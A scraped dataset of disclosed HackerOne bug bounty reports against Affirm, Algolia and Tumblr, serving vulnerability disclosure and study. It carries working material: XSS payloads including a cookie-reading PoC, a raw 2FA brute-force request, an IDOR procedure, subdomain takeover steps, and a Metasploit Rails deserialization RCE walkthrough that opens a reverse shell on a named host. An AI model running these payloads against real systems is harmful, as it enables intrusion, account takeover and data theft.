If the Affirm-Client is valid, then you would get the user details on this endpoint which would confirm this vulnerability.
Code 834 BytesWrap lines Copy Download1{""phone_number"": {""phone_number"": ""+1-702-217-0000"", ""user_id"": ""1479-5770-XGGL"", ""id"": ""CNAIG0U1BMPHN5BK""}, ""status"": ""ACTIVE"", ""name"": {""last"": ""NEPAK"", ""full"": ""TESTING NEPAK"", ""user_id"": ""1479-5770-XGGL"", ""id"": ""4ZBC33TYEY12SOWP"", ""first"": ""TESTING""}, ""is_personalized_services_active"": true, ""created"": ""2019-12-31T10:48:00Z"", ""dob"": ""1980-06-23"", ""id"": ""1479-5770-XGGL"", ""address_confirmation_status"": ""not confirmed"", ""address"": {""city"": ""San Francisco"", ""user_id"": ""1479-5770-XGGL"", ""is_po_box"": false, ""street1"": ""325 Pacific Ave"", ""region1_code"": ""CA"", ""is_military_address"": false, ""postal_code"": ""94111"", ""country_code"": ""USA"", ""id"": ""G2YM6ESBLH36ETLZ""}, ""user_consented_to_lto"": null, ""email"": {""verified"": false, ""user_id"": ""1479-5770-XGGL"", ""email"": ""who_has_no_name+0000@wearehackerone.com"", ""id"": ""B9SUH5XOB1559Q8J""}}
Image F672319: 2.PNG 87.69 KiBZoom in Zoom out Copy Download
Remediation
Rate limiting could be one of the fundamental solutions by limiting the number of the wrong OTP a user can submit.
The fundamental problem here is not that OTP is possible for Bruteforce, but the lack of token expiry generated for login purpose.
Luckily, there is a better way for this. When the user enters the number, and a password login URL/login is generated on the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/, the URL could be set invalid after a few OTP limits.
Once this is set to expiry, then to make another consecutive request to the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/SOMETOKEN would be automatically invalid. This should be done without even checking OTP to prevent brute-forcing. The login token generation on the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/ should be limited.
POC Video
Video F672564: Screen_Recording_2020-01-01_at_12.47.37_AM.mov 34.58 MiBZoom in Zoom out Copy Download
-Happy New year team Affirm <3
Impact
Unauthorized account access, Account takeover3 attachments:F672314: 1.PNGF672319: 2.PNGF672564: Screen_Recording_2020-01-01_at_12.47.37_AM.mov",https://hackerone.com/reports/766578,California,United States,San Francisco,2019,12,31,19,28
Affirm,1001-5000,0.0,over-1b,$500.00,Medium,5.45,Insecure Direct Object Reference (IDOR),IDOR to view order information of users and personal information,"xfiltrer  submitted a report to Affirm.Aug 30th (about 1 year ago)Summary:
[Broken access control is the method of controlling which users can perform a certain type of action or view set of data. Broken access control is a vulnerability that allows an attacker to circumvent those controls and perform more actions than they are allowed to, or view content they typically don’t have access to. Such vulnerability, when exploited, could lead to massive loss of data.]
Steps To Reproduce:
Navigate to https://razer.com and purchase something
Now select the option to use “Affirm” as a financing option
Look for the POST parameter of /api/██████/ and the request will inform you of the “checkout_ari”:“XXXXXXXXXXXXXXXX” generated for that specific purchase.
Forward this Request to the repeater, then change the value “checkout_ari”:“XXXXXXXXXXXXXXXX” to “checkout_ari”:“YYYYYYYYYYYYYYYYY” and the back-end will return the requested order with all the user’s purchase information from his full address, means payments, and products.
Please check the attachments for POCs
Supporting Material/References:
 image.png1(██████████)
image2(██████████)
image3(██████)
image4(████)
video(███)
  Remediation Recommendations
Implement proper access control measures around data sets and functions. Ensure that only authorized users are able to view data or perform the functions they are intended. Implement object-based access controls. This will ensure that users who circumvent UI restrictions are still restricted from retrieving any sensitive data or perform restricted actions without proper authorization. Please review the OWASP foundations recommendations for more specific details on Broken Access Control.
References
https://www.owasp.org/index.php/Category:Access_Control
https://www.owasp.org/index.php/Access_Control_In_Your_J2EE_Application
https://www.owasp.org/index.php/Broken_Access_Control
Impact
Once a flaw is discovered, the consequences of a flawed access control scheme can be devastating. In addition to viewing unauthorized content, an attacker might be able to change or delete content, perform unauthorized functions, or even take over site administration.",https://hackerone.com/reports/1323406,California,United States,San Francisco,2021,8,30,3,36
Affirm,1001-5000,0.0,over-1b,$250.00,Low,2.0,Open Redirect,Open Redirect,"0xlittleboy  submitted a report to Affirm.May 31st (about 1 year ago)Open Redirect Vulnerability:
URL : https://www.affirm.com/
User can be redirect to malicious site
POC:https://www.affirm.com///google.com/?www.affirm.com/?category=interview&page=2
I hope you know the impact of open redirect and more info refer
https://cwe.mitre.org/data/definitions/601.html
Impact
User can be redirect to malicious site2 attachments:F1321599: affirm.PNGF1321600: affirm2.PNG",https://hackerone.com/reports/1213580,California,United States,San Francisco,2021,5,31,15,9
Affirm,1001-5000,0.0,over-1b,$250.00,Low,2.0,Improper Access Control - Generic,Subdomain takeover due to non registered TLD [ ██████████.█████.██████.com ],"0xprial  submitted a report to Affirm.Aug 19th (about 1 year ago)Summary:
I was looking at recent disclosed report #1297689 and I was thinking to take a look for the same issue on this asset as I love to test for subdomain takeover vulnerabilities. 
While testing I noticed a DNS entry for ███████.████.██████████.com is CNAME ████.███████████ which's TLD is not registered yet and also not reserved for using Internal DNS Domain Name . As a result, an attacker can register for the ███ TLD to create and takeover ███████.████████.█████.com subdomain.
Steps To Re█████████uce:

Check CNAME record of █████.█████.██████.com subdomain and you will see a record like below

Code 693 BytesWrap lines Copy Download10xPrial@n00b ~ % dig ████.████.████.com
2
3; <<>> DiG 9.10.6 <<>> ██████.█████.████.com
4;; global options: +cmd
5;; Got answer:
6;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 27323
7;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 1
8
9;; OPT PSEUDOSECTION:
10; EDNS: version: 0, flags:; udp: 4096
11;; QUESTION SECTION:
12;██████.███████.████.com.	IN	A
13
14;; ANSWER SECTION:
15██████████.███████.██████.com. 300 IN	CNAME	██████████.██████████████.
16
17;; AUTHORITY SECTION:
18.			10800	IN	SOA	a.root-servers.net. nstld.verisign-grs.com. 2021081901 1800 900 604800 86400
19
20;; Query time: 216 msec
21;; SERVER: 10.0.0.1#53(10.0.0.1)
22;; WHEN: Fri Aug 20 02:18:14 +06 2021
23;; MSG SIZE  rcvd: 162
24

Take a look at CNAME value what is ████.████████████. domain which TLD is ████ what is not registered yet. So it's available to register and buy the domain.
You can check already registered TLD's from this list: http://data.iana.org/TLD/tlds-alpha-by-domain.txt

Supporting Material/References:
And Internal used reserved domains TLD are

.test
.example
.invalid
.localhost

Impact
An attacker can register for ████████ TLD to take over the target subdomain by buying ██████████ domain and create █████.███████ subdomain to serve content on █████.█████████.█████████.com subdomain, which can lead to malicious attacks against users. Users will see this as a valid domain of Affirm and they may share their sensitive information with an attacker.
Reference documents:

https://www.itprotoday.com/active-directory/q-can-i-use-local-or-pvt-top-level-domain-tld-names-part-active-directory-ad-tree
https://helgeklein.com/blog/2008/09/choosing-a-future-proof-internal-dns-domain-name-mission-impossible/

RECOMMENDED FIX
It looks like it was a human error while creating that subdomain record. If it was an error update that DNS record to a correct one or delete it if it's not in need.
Regards
Prial",https://hackerone.com/reports/1312365,California,United States,San Francisco,2021,8,19,20,28
Affirm,1001-5000,0.0,over-1b,$500.00,Medium,5.3,Business Logic Errors,Subdomain takeover of www█████████.affirm.com,"ian  submitted a report to Affirm.Aug 10th (about 1 year ago)Summary
Hi there, assuming you want this report as your policy mentions Affirm resources with third-parties, but the scope was a little unclear. Regardless, www█████.affirm.com points to an AWS S3 bucket affirm-prod-www-cms█████████ that no longer exists. I was able to take control of this bucket and put my own content onto it. I can now serve content on this domain, obtain a TLS certificate for this domain, etc.
If any customers or servers are pointing to anything within this domain, I could serve them arbitrary/malicious content. I could also use this in case your domain whitelists your own domain for OAuth, or if there are cookies scoped to the entire domain. Usually this can have a high impact.
Note: S3 has a weird quirk where the bucket's region may cause errors if a request to a bucket is addressed to the wrong region. I assume your CDN points to ████-2, but my bucket is in us-east-1. When you make a request to this domain, S3 shows a redirect error because of this. If I wanted to move the bucket to the correct region (for the PoC to fully work), it would put it at risk of being claimed by attackers/others. Hopefully, this is enough for you.
PoC
To see that the domain points to the affirm-prod-www-cms█████ bucket:
Code 318 BytesWrap lines Copy Download1% curl https://www██████████.affirm.com
2[...]
3<Code>PermanentRedirect</Code>
4<Message>The bucket you are attempting to access must be addressed using the specified endpoint. Please send all future requests to this endpoint.</Message>
5<Endpoint>s3.amazonaws.com</Endpoint>
6<Bucket>affirm-prod-www-cms████</Bucket>
7[...]
Following this redirect, to see the PoC:
Code 149 BytesWrap lines Copy Download1% curl https://s3.amazonaws.com/affirm-prod-www-cms████████/index.html
2<!-- taken over by hackerone.com/ian bugcrowd.com/iangcarroll ian@lhost.sh -->
Impact
Subdomain takeover",https://hackerone.com/reports/1297689,California,United States,San Francisco,2021,8,10,5,53
Airbnb,5001-10000,0.0,200m-1b,"$2,500.00",Low,2.0,HTTP Response Splitting,[m.airbnb.com] CRLF Injection,bobrov  submitted a report to Airbnb.Jan 10th (6 years ago),https://hackerone.com/reports/197279,California,United States,San Francisco,2017,1,10,15,30
Algolia,501-1000,0.0,1m-10m,$100.00,No value,0.0,Improper Authentication - Generic,2-factor authentication bypass,"malcolmx  submitted a report to Algolia.Jun 18th (6 years ago)Hello aligola team,
there are 2-factor authentication bypass while login 
Steps=>
1.made 2-factor authentication in your account
2.login to your account
3.you will see that your account is already opened without do 2-factor authentication 
POC video attached 
Thanks1 attachment:F100143: 2-factor_authentication_bypass.mp4adams Algolia staff  changed the status to Triaged. Jun 18th (6 years ago)What you see is due to the fact that you have not finished setting of 2FA. It is necessary to verify successful setup of 2FA by entering the 2FA code and only then the 2FA gets activated. We're working on the fix of the indicator. The account should not show the 2FA is enabled unless the setup process is completed.malcolmx   posted a comment. Jun 18th (6 years ago)yes the account should be hide until the user enter 2FA codeadams Algolia staff  changed the status to Triaged. Jun 21st (6 years ago)alem   posted a comment. Jul 4th (6 years ago)Thanks for bearing with us @malcolmx. The issue described in this report should now be resolved, can you please confirm ? Thanks.malcolmx   posted a comment. Jul 4th (6 years ago)yes it fixed now !alem   closed the report and changed the status to Resolved. Jul 4th (6 years ago)Thanks for your help @malcolmx.Algolia  rewarded malcolmx with a $100 bounty. Jul 4th (6 years ago)malcolmx   posted a comment. Jul 4th (6 years ago)@alexandremeunier
one more thing!
if we send this link https://www.algolia.com/users/displayqr to any user
we enable 2-factor authentication  for his account!malcolmx   requested to disclose this report. Dec 18th (6 years ago)malcolmx   posted a comment. Dec 19th (6 years ago)@alexandremeunier @adams
possible to disclose this one?  This report has been disclosed. Jan 17th (6 years ago)Summary by malcolmx 2FA is enabled unless the setup process is completed",https://hackerone.com/reports/145629,California,United States,San Francisco,2016,6,18,5,46
Algolia,501-1000,0.0,1m-10m,$200.00,High,7.95,Cross-site Scripting (XSS) - DOM,[GitHub Extension] Unsanitised HTML leading to XSS on GitHub.com,"ysx  submitted a report to Algolia.Apr 12th (6 years ago)Hi,
I noticed that certain HTML is unsanitised by the Awesome Autocomplete for GitHub extension, leading to a case of XSS on the GitHub website.
Please note that I do not have ownership nor affiliation with the repository and user names in this report, nor the final JavaScript alert dialog. 
Proof of Concept
I have tested the following Proof of Concept demonstrations with the following conditions:
Extension

Latest version of the Awesome Autocomplete extension

Operating Systems

macOS Sierra 10.12.4
Windows 7 x64

Browsers

Google Chrome 57.0.2987.133 (latest)
Safari 10.1 (latest)

Unsanitised HTML
Please follow the below steps to demonstrate the presence of an unsanitised HTML issue.

Search for '""><img src=x onerror= on GitHub.com
Note the broken <img> element and requests to ""x"" on GitHub.com

The following images demonstrate that a broken <img> element was created in the context of GitHub.com by the Algolia extension:
Image F175284: Unsanitised_1.png 25.59 KiBZoom in Zoom out Copy Download
Image F175283: Unsanitised_2.png 64.60 KiBZoom in Zoom out Copy Download
XSS on GitHub
Please follow the below steps to demonstrate the presence of a full XSS issue.

Search for a'""><h1 on GitHub.com
Because of a specific repository name being loaded, a JavaScript alert dialog will appear:

Image F175285: XSS_1.png 28.47 KiBZoom in Zoom out Copy Download
As noted above, I am currently attempting to reproduce this vulnerability using my own repositories and JavaScript code (e.g. document.domain rather than ""1337"").
Please let me know if you require any additional information regarding these vulnerabilities.
Thanks!3 attachments:F175283: Unsanitised_2.pngF175284: Unsanitised_1.pngF175285: XSS_1.pngSummary by ysxIn certain cases, HTML elements were unsanitised by the Awesome Autocomplete extension when presented in DOM, leading to XSS on the GitHub website. Thanks to the Algolia team for the swift resolution and fix.",https://hackerone.com/reports/220494,California,United States,San Francisco,2017,4,12,14,39
Algolia,501-1000,0.0,1m-10m,$100.00,Medium,5.45,Cross-site Scripting (XSS) - Generic,[github.algolia.com] DOM Based XSS github-btn.html,"bobrov  submitted a report to Algolia.Jan 24th (6 years ago)Description
Vulnerable parameter: user
Vulnerable script: https://github.algolia.com/github-btn.html
Vulnerable code:
Code 511 BytesWrap lines Copy Download1        var params = function() {
2                for (var t, e = [], o = window.location.href.slice(window.location.href.indexOf(""?"") + 1).split(""&""), r = 0; r < o.length; r++) t = o[r].split(""=""), e.push(t[0]), e[t[0]] = t[1];
3                return e
4            }(),
5            user = params.user,
6            repo = params.repo,
7            type = params.type,
8 ...
9  ""follow"" == type && (mainButton.className += "" github-me"", text.innerHTML = ""Follow @"" + user, button.href = ""https://github.com/"" + user
PoCs
PoC #1
HTML Injection for Chrome, Internet Explorer
Code 123 BytesWrap lines Copy Download1https://github.algolia.com/github-btn.html?#&user=<h1><marquee>HTML<br>HTML<br>HTML<br>HTML<br>HTML<br>HTML<br>&type=follow
PoC #2
XSS for Internet Explorer (using X-UA-Compatible IE=9)
Code 262 BytesWrap lines Copy Download1https://blackfan.ru/xss?c=%3Cmeta%20http-equiv=%22X-UA-Compatible%22%20content=%22IE=9%22%3E%3Ciframe%20src=%27https://github.algolia.com/github-btn.html?%23%26user=yrdy%3Cscript%3Ealert(document.domain);alert(document.cookie);//%26type=follow%27%3E%3C/iframe%3E
Another vulns
Also, this script has potential vulnerabilities using user controlled parameters in the path to the JS script.
But for the exploitation it requires additional vulnerability on api.github.com (for example, Open Redirect or user controlled output).
Code 263 BytesWrap lines Copy Download1function jsonp(t) {
2  var e = document.createElement(""script"");
3  e.src = t + ""?callback=callback"", head.insertBefore(e, head.firstChild)
4}
5...
6jsonp(""follow"" == type ? ""https://api.github.com/users/"" + user : ""https://api.github.com/repos/"" + user + ""/"" + repo);
PoC
Code 110 BytesWrap lines Copy Download1https://github.algolia.com/github-btn.html?#&user=../../another/endpoint&repo=../../another/endpoint&type=fork
Result
Code 57 BytesWrap lines Copy Download1https://api.github.com/another/endpoint?callback=callback1 attachment:F154745: Screenshot_at_19-44-33.pngbobrov   posted a comment. Jan 26th (6 years ago)Vulnerability fixedadams Algolia staff  closed the report and changed the status to Resolved. Jan 27th (6 years ago)Thank you for the report. Yes, it got fixed, thank you for the confirmation.Algolia  rewarded bobrov with a $100 bounty. Jan 27th (6 years ago)Despite the report being out of the scope we have decided to exceptionally award the bounty.bobrov   requested to disclose this report. Mar 1st (6 years ago)  This report has been disclosed. Mar 31st (6 years ago)",https://hackerone.com/reports/200826,California,United States,San Francisco,2017,1,24,15,45
Algolia,501-1000,0.0,1m-10m,$100.00,No value,0.0,Cross-site Scripting (XSS) - Generic,an xss issue,"securitythinker  submitted a report to Algolia.Nov 12th (7 years ago)i found an xss issue here :
https://www.algolia.com/explorer#?index=test&tab=ranking
i tried to put  an xss payload (""><img src=x onerror=alert(0)>)
in index > ranking> so i put the xss payload in Ranking formula then hit save ...when it is being saved the xss payload is being stored that upon Indices xss payload executed
p.s please screen shot3 attachments:F61331: 44.pngF61332: 444.pngF61333: 4444.png",https://hackerone.com/reports/99368,California,United States,San Francisco,2015,11,12,21,24
Algolia,501-1000,0.0,1m-10m,$100.00,Medium,5.45,Information Disclosure,An “algobot”-s GitHub access token was leaked,"sainaen  submitted a report to Algolia.Mar 9th (6 years ago)An access token of algobot account was first leaked 2015-12-02 in this Travis CI job log of instantsearch.js project due to incorrect handling of output from command git clone (or a ghpages module to be more specific.) Since then, the configuration of that project seems to have been changed not to perform this operation (last build with token found is from 2016-01-06), but the docsearch project still uses it and leaks algobot's token with every build of the master branch, here's for example the latest one.
This token has a public_repo scope, so it gives commit access to any public repositories its owner has access to. So both instantsearch.js and docsearch are affected.
You may want to verify that there were no suspicious changes since the first leak. Unfortunately I didn't find any way to check the token usage history, so cannot help with that.
Note that I did use this token to get its owner info (GET call to endpoint https://api.github.com/user) and repositories that belong to them (GET call to https://api.github.com/user/repos), but I didn't attempt to perform any other operations.
Also, please be sure to avoid disclosing this issue accidentally (e.g. in commit messages), as I'm still working with others that have similar leaks. Revoking/rotating tokens without explanation with simple “updating the token” should be fine though, generally nobody pays attention to them.",https://hackerone.com/reports/212067,California,United States,San Francisco,2017,3,9,20,27
Algolia,501-1000,0.0,1m-10m,"$1,000.00",No value,0.0,Improper Authentication - Generic,API Key added for one Indices works for all other indices too.,"bugs3ra  submitted a report to Algolia.Feb 26th (7 years ago)Hi,
I created one API key and restricted it to only one index by adding it and gave it right for creating record.
Now this api can be used to add records in other indeces in same account.
Screenshot is attached2 attachments:F75488: API_permissions.JPGF75489: API_request_response.JPG",https://hackerone.com/reports/118925,California,United States,San Francisco,2016,2,26,11,12
Algolia,501-1000,0.0,1m-10m,$300.00,Medium,5.45,Improper Authentication - Generic,email verification bypass,akashhamal0x01  submitted a report to Algolia.Jan 28th (2 years ago)Summary by akashhamal0x01A logical flaw resulting in email verification bypass! :D,https://hackerone.com/reports/1089205,California,United States,San Francisco,2021,1,28,7,36
Algolia,501-1000,0.0,1m-10m,$100.00,No value,0.0,Open Redirect,Hyperlink Injection in Friend Invitation Emails,"corb3nik  submitted a report to Algolia.Aug 31st (6 years ago)Description
A user can change their last name to a URL in order to send email invitations containing malicious hyperlinks.
Steps to Reproduce

Create a new Algolia account with the last name http://example.com.
Navigate to My Account > Referrral
Send an invitation to an email address that you control

You will receive a new email with the last name being a link to a potentially malicious site.
Consequences
This permits users to send malicious/phishing links to potential clients. It could also have an effect on how spam filters treat algolia.com emails.1 attachment:F116299: proof.png",https://hackerone.com/reports/164833,California,United States,San Francisco,2016,8,31,20,8
Algolia,501-1000,0.0,1m-10m,$300.00,Medium,5.45,Information Disclosure,Information disclosure -> 2fa bypass -> POST exploitation,"akashhamal0x01  submitted a report to Algolia.Jul 23rd (about 1 year ago)Greetings!
So i was testing algolia.com. Impressed to find out that there are mitigations in place to prevent POST exploitation such as : 
When 2fa is enabled we need ""old password""  to update following things : 

To update the password
To disable the 2fa, etc (might more more....)

And we need 2fa codes to do following actions : 

To change email
To download recovery codes 
To delete account, etc (might be more...)

So given these security checks, even if an account is compromised ( attacker don't know password or have access to 2fa or anything but only access to account)
For example, just consider a scene that the victim is  using your website in cyber cafe and forgets to for example logout.
So the attacker will check all functionalities to make victims account his/her but provided that he/she needs to have either access to 2fa or know password then he/she will be helpless. So now attacker starts to find vulnerabilities in website!
So here i found that the ""gauth_secret"" is potentially leaked in response (which is not normal and is unnecesarry to leak), which means that the attacker who got access to the account can take advantage of this information leakage , use that ""gauth_secret"" value in authenticator app and then bypass the checks by providing the correct codes!
So this way an attacker can bypass authentication and execute critical actions like :

updating mail , deleting acc , etc

Steps to reproduction :
first login into algolia.com and then 

Go to ""https://www.algolia.com/account/support"" 
There will be 2 buttons : ""Revoke"" and ""Renew"", click on ""Renew"" and intercept that request using proxy like burp suite
Now  send that request to repeater and forward that request
In repeater, replay the request and check response and look for ""gauth_secret"" and then copy the value of that key
download google authenticator app and then paste it , then it will show the codes
Now u can execute actions as you know the 2fa codes now!

Impact
Since there are checks implemented for every critical action , i think the leakage of ""gauth_secret"" here let attacker bypass those checks by knowing 2fa
So now the attacker can delete account, update email and do much more critical actions and totally compromise victims account
Solution : Don't leak the gauth_secret in response",https://hackerone.com/reports/1276373,California,United States,San Francisco,2021,7,23,18,33
Algolia,501-1000,0.0,1m-10m,$100.00,No value,0.0,Violation of Secure Design Principles,No rate limit for Referral Program,"latitudan  submitted a report to Algolia.Sep 22nd (6 years ago)Hi,
It is possible to bombard the referral requests to the same email any number of times.
Thanks,1 attachment:F122209: Screenshot_from_2016-09-22_20-09-28.png",https://hackerone.com/reports/171205,California,United States,San Francisco,2016,9,22,14,41
Algolia,501-1000,0.0,1m-10m,$100.00,No value,0.0,Cryptographic Issues - Generic,No Rate Limit In Inviting Similar Contact Multiple Times,"rajauzairabdullah  submitted a report to Algolia.Jul 17th (6 years ago)There is not Rate limit in Inviting a similar contact Multiple times
See the attachment for confirmation :2 attachments:F105413: norate1.JPGF105414: ratelimit2.JPG",https://hackerone.com/reports/151868,California,United States,San Francisco,2016,7,17,5,4
Algolia,501-1000,0.0,1m-10m,$100.00,No value,0.0,Improper Authentication - Generic,No rate-limit in Two factor Authentication leads to bypass using bruteforce attack,"bugs3ra  submitted a report to Algolia.Apr 6th (7 years ago)Hi,
There is no rate limit set for Two factor authentication, which demand for code sent to mobile. This code can be bruteforced easily to bypass this.
Code 1.05 KiBWrap lines Copy Download1POST /users/testqr HTTP/1.1
2Host: www.algolia.com
3User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate, br
7Referer: https://www.algolia.com/users/displayqr
8Cookie: __cfduid=dbe6010b3183f275b85d61f6dbce0417a1459962341; _ga=GA1.2.1293083525.1459962367; PRUM_EPISODES=s=1459971091672&r=https%3A//www.algolia.com/users/displayqr; _session_id=c8f877144126b9e3142d158ce5fbadfb; kvcd=1459971056919; km_ai=20868; km_uq=; km_lv=x; visitor_id139121=7630498; __cid=2af41b1f-9f59-4c7e-a3ef-e0c43327b92f; km_ni=20868; _hjIncludedInSample=1; _gat=1; _dc_gtm_UA-32446386-9=1; km_vs=1; km_identity=f7975d47418f3d188a1ed45468bc2c7e; _gat_UA-32446386-9=1; km_aliased=true
9Connection: close
10Content-Type: application/x-www-form-urlencoded
11Content-Length: 168
12
13utf8=%E2%9C%93&authenticity_token=twHnV25SUnlKr2rqoBCjEcZ5M749eY1aLiX8gL9f7NiR4PJreIlBlBtn3X6F6qi7Z1JBQOKNgFxFVKapX4lCdg%3D%3D&users%5Bgauth_token%5D=6700&commit=Verify
Brutforce.JPG (F83580)1 attachment:F83580: Brutforce.JPGSummary by bugs3raTwo Factor Authentication bypass  allows user to access application without entering verification code and no rate limit is set to protect from Code bruteforce attack.",https://hackerone.com/reports/128777,California,United States,San Francisco,2016,4,6,19,41
Algolia,501-1000,0.0,1m-10m,$500.00,No value,0.0,Code Injection,RCE on facebooksearch.algolia.com,"michiel  submitted a report to Algolia.Apr 25th (7 years ago)While doing recon on Algolia, I found that the session secret for facebooksearch.algolia.com has been committed to a public GitHub repository. Since the Rails app running at facebooksearch.algolia.com is using CookieStore as the session storage, this means an attacker knowing the session secret can craft any cookie that will then be accepted by the server.
Cookie values are deserialized (unmarshalled) server-side. That combined with knowing the session secret creates the dangerous opportunity for an RCE. The attacker can sign a cookie that contains a Ruby object that evals arbitrary code when it is deserialized on the server side. The concept is explained in depth here: https://charlie.bz/blog/rails-3.2.10-remote-code-execution. 
Where did I find the session secret?
I used Gitrob to scan all of Algolia's public repositories (plus repositories from employees) and extract everything that is interesting. The secret_token.rb initializer immediately caught my attention since it usually contains the secret_key_base, which should never be public. 
The token can be found here: https://github.com/algolia/facebook-search/commit/f3adccb5532898f8088f90eb57cf991e2d499b49#diff-afe98573d9aad940bb0f531ea55734f8R12
Proof of Concept
@joernchen developed a ready to go proof of concept for this vulnerability and submitted it to the Metasploit Framework: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/rails_secret_deserialization.rb
Since the version of the exploit doesn't take cookies with - into account, here is a small patch to allow the exploit to work on the _facebook-search_session cookie. Here's the patch for the exploit: 
Code 227 BytesWrap lines Copy Download1     if res && !res.get_cookies.empty?
2-      match = res.get_cookies.match(/([_A-Za-z0-9]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)
3+      match = res.get_cookies.match(/([_A-Za-z0-9\-]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)
4     end
With that patch applied, you can run the PoC from msfconsole by following these commands:
Code 309 BytesWrap lines Copy Download1# setting up
2use exploit/multi/http/rails_secret_deserialization
3set secret ""<grab-from-github-url>""
4set rhost facebooksearch.algolia.com
5set railsversion 4
6set targeturi /auth/facebook
7
8# and then run
9exploit
10
11# when successful, a reverse shell will be established
12# this allows you to run arbitrary commands
As a proof of concept, I ran id:
Code 50 BytesWrap lines Copy Download1id
2uid=1000(prod) gid=1000(prod) groups=1000(prod)
But since that is very generic, I also created http://facebooksearch.algolia.com/hackerone.txt with the text ""PoC by michiel"" to proof regular write access is possible as well. 
Remediation
Switch config/initializers/secret_token.rb to use an environment variable (e.g. ENV['SECRET_KEY_BASE']). You must also generate a new token because the current secret is compromised. A new secret can be generated by running rake secret from the command line. Make sure the new secret does not leak in git commit history.",https://hackerone.com/reports/134321,California,United States,San Francisco,2016,4,25,5,47
Algolia,501-1000,0.0,1m-10m,$100.00,No value,0.0,Cross-site Scripting (XSS) - Generic,Reflected XSS,"no_thing  submitted a report to Algolia.Feb 3rd (6 years ago)no_thing   has requested mediation from HackerOne Support. Feb 8th (6 years ago)no_thing   posted a comment. Feb 10th (6 years ago)adams Algolia staff  posted a comment. Feb 11th (6 years ago)no_thing   posted a comment. Feb 11th (6 years ago)Algolia  rewarded no_thing with a $100 bounty. Feb 11th (6 years ago)adams Algolia staff  closed the report and changed the status to Resolved. Feb 11th (6 years ago)no_thing   posted a comment. Updated Feb 11th (6 years ago)no_thing   requested to disclose this report. Feb 11th (6 years ago)adams Algolia staff  agreed to disclose this report. Feb 11th (6 years ago)  This report has been disclosed. Feb 11th (6 years ago)Summary by no_thingThanks @Algolia , @adams for Fixing this Bug
@Algolia , Keep it up ;) 
Regards
Mahmoud Osama (Mahmoud0x00)",https://hackerone.com/reports/203241,California,United States,San Francisco,2017,2,3,18,36
Algolia,501-1000,0.0,1m-10m,"$1,100.00",High,7.95,Information Disclosure,Information disclosure via a misconfigured third-party product,"h4x0r_dz  submitted a report to Algolia.Nov 17th (3 years ago)Summary by h4x0r_dz Disclosure of all Algolia users information, like email, phone ...etc",https://hackerone.com/reports/739251,California,United States,San Francisco,2019,11,17,9,15
Automattic,1001-5000,0.0,50m-100m,$200.00,Medium,4.9,Denial of Service,[api.tumblr.com] Denial of Service by cookies manipulation,"fuzzme  submitted a report to Automattic.Oct 11th (2 years ago)Hello
Summary:
I have found at api.tumblr.com two parameters consumer_key  &&  consumer_secret allow to modify oa-consumer_key  && oa_consumer_secret  cookies values and property.
An attacker can send a malicious link to reset the cookies of api.tumblr.com, this lead to DOS.
To trigger the DOS, the target/victim account need to click a malicious link.
To restore the account, the victim need to delete all cookies on api.tumblr.com.
Similar issues :  https://hackerone.com/reports/583819
Vulnerable Url
Code 36 BytesWrap lines Copy Download1https://api.tumblr.com/console/auth?
Vulnerable Paramater(s)
Code 99 BytesWrap lines Copy Download1$_GET['consumer_key'];
2$_GET['consumer_secret'];
3$_POST['consumer_key'];
4$_POST['consumer_secret'];
Steps To Reproduce:


Login at https://www.tumblr.com/


Go to https://www.tumblr.com/oauth/apps and create a random application


/!\ if the cookies ""oa-consumer_key"" && ""oa_consumer_secret"" already exist the attack doesn't  work /!\

After, create your application, click to this malicious following link 

Code 178 BytesWrap lines Copy Download1https://api.tumblr.com/console/auth?consumer_key=x;%20domain=tumblr.com;%20Max-Age=1000000000000000000000&consumer_secret=x;%20domain=tumblr.com;%20Max-Age=1000000000000000000000


Go back to https://www.tumblr.com/oauth/apps and try to connect to api.tumblr.com by clicking in ""Explore API"".
You will be redirected to https://www.tumblr.com/oauth/authorize?oauth_token=*&source=console and click to authorize


loggout and login at tumblr.com


Try again to connect to your application


You can follow me in the video POC.
Thanks, good bye.
Impact
Denial of Service and cookies manipulation1 attachment:F1031850: poc.mp4xknown Automattic staff  posted a comment. Oct 13th (2 years ago)Thank you for your submission. Your report will be reviewed and we'll get back to you shortly.xknown Automattic staff  changed the status to Triaged. Oct 13th (2 years ago)fuzzme   posted a comment. Oct 13th (2 years ago)Hello, ok, thank you.sndsgd   posted a comment. Oct 14th (2 years ago)We've applied a patch to resolve this issue.fuzzme   posted a comment. Oct 14th (2 years ago)Okfuzzme   posted a comment. Oct 16th (2 years ago)Hello, I take this opportunity to ask you if you accept CSRF in https://tumblr.com/submit_form/[blog].tumblr.com/ or  https://tumblr.com/ask_form/[blog].tumblr.com/?
thanks .fuzzme   posted a comment. Oct 20th (2 years ago)Hi @sndsgd , do you have any update ?
Keep me informed of any updates,
thanks.xknown Automattic staff  closed the report and changed the status to Resolved. Oct 30th (2 years ago)Automattic  rewarded fuzzme with a $200 bounty. Oct 30th (2 years ago)Hi @fuzzme, we would like thank you again for your submission and helping make Tumblr a safer place. We look forward to more reports from you in the future.fuzzme   requested to disclose this report. Oct 30th (2 years ago)Hello all, Thank you for the bounty, we can disclose this report?  This report has been disclosed. Nov 29th (2 years ago)",https://hackerone.com/reports/1005421,California,United States,San Francisco,2020,10,11,22,46
Automattic,1001-5000,0.0,50m-100m,$150.00,Low,2.0,UI Redressing (Clickjacking),[api.tumblr.com] Exploiting clickjacking vulnerability to trigger self DOM-based XSS,"fuzzme  submitted a report to Automattic.Aug 7th (2 years ago)Hello i have found a clickjacking vulnerability in https://api.tumblr.com/console/*
And a self DOM-based XSS In https://api.tumblr.com/console/calls/user/(follow/unfollow)
A attacker can exploit the clickjacking  to trigged the self DOM-based XSS
Vulnerable URL to clickjacking :
https://api.tumblr.com/console/*
Vulnerable URL to self DOM-based XSS :
https://api.tumblr.com/console/calls/user/unfollow
https://api.tumblr.com/console/calls/user/follow
